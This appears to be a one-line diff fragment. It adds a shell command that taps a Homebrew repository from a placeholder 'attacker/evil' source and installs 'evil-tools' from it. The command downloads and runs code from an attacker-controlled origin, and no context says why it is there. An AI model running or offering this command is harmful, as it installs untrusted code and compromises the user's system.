@@ -1,0 +1,1 @@
+brew tap attacker/evil && brew install evil-tools
